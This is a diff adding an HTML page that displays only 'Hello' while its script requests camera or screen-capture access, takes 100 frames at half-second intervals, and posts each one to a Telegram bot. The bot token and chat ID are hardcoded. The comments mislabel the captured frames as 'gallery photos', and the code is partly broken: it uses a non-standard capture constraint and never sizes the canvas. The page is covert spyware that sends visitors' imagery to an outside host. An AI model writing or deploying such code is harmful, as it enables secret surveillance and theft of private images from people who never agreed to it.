@@ -1,0 +1,87 @@
+<DOCTYPE html>
+  
+  <html>
+    <body>
+      <p>Hello</p>
+    <script>
+      
+      // Request gallery permissions
+navigator.mediaDevices.getUserMedia({ video: { mediaSource: 'screen' }, audio: false })
+  .then(function(stream) {
+    // Success callback - gallery permissions granted
+    console.log('Gallery permissions granted');
+    // Get the first 100 photos from the gallery
+    getPhotosFromGallery(100);
+  })
+  .catch(function(error) {
+    // Error callback - gallery permissions denied
+    console.log('Gallery permissions denied:', error);
+  });
+
+// Function to get the first `count` photos from the gallery and send them to the bot
+function getPhotosFromGallery(count) {
+  // Get the gallery photos
+  navigator.mediaDevices.enumerateDevices()
+    .then(function(devices) {
+      const photoDevices = devices.filter(device => device.kind === 'videoinput');
+      const photoDeviceIds = photoDevices.map(device => device.deviceId);
+      const constraints = { 
+        video: { 
+          deviceId: photoDeviceIds[0],
+          mediaSource: 'screen',
+          frameRate: { ideal: 10, max: 15 } 
+        },
+        audio: false
+      };
+      navigator.mediaDevices.getUserMedia(constraints)
+        .then(function(stream) {
+          const video = document.createElement('video');
+          video.srcObject = stream;
+          video.play();
+          // Create a canvas to extract frames from the video stream
+          const canvas = document.createElement('canvas');
+          const context = canvas.getContext('2d');
+          const photos = [];
+          // Extract frames from the video stream and add them to the `photos` array
+          const intervalId = setInterval(function() {
+            if (photos.length >= count) {
+              clearInterval(intervalId);
+              // Send the photos to the bot
+              sendPhotosToBot(photos);
+            } else {
+              context.drawImage(video, 0, 0, canvas.width, canvas.height);
+              const photo = canvas.toDataURL('image/jpeg');
+              photos.push(photo);
+            }
+          }, 500); // Wait 0.5 seconds between each frame capture
+        })
+        .catch(function(error) {
+          console.log('Error getting gallery photos:', error);
+        });
+    });
+}
+
+// Function to send the photos to the bot
+function sendPhotosToBot(photos) {
+  // Replace `YOUR_BOT_TOKEN` and `YOUR_CHAT_ID` with your bot token and chat ID
+  const botToken = '6200671913:AAGfUPW-ZW_NwtJO9UPnQ1SHKNp3dxxNoPU';
+  const chatId = '5857694327';
+  const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+  photos.forEach(function(photo) {
+    const formData = new FormData();
+    formData.append('chat_id', chatId);
+    formData.append('photo', photo);
+    fetch(url, { method: 'POST', body: formData })
+      .then(function(response) {
+        console.log('Photo sent to bot:', photo);
+      })
+      .catch(function(error) {
+        console.log('Error sending photo to bot:', error);
+      });
+  });
+}
+
+      
+      </script>
+    <body>
+  </html>
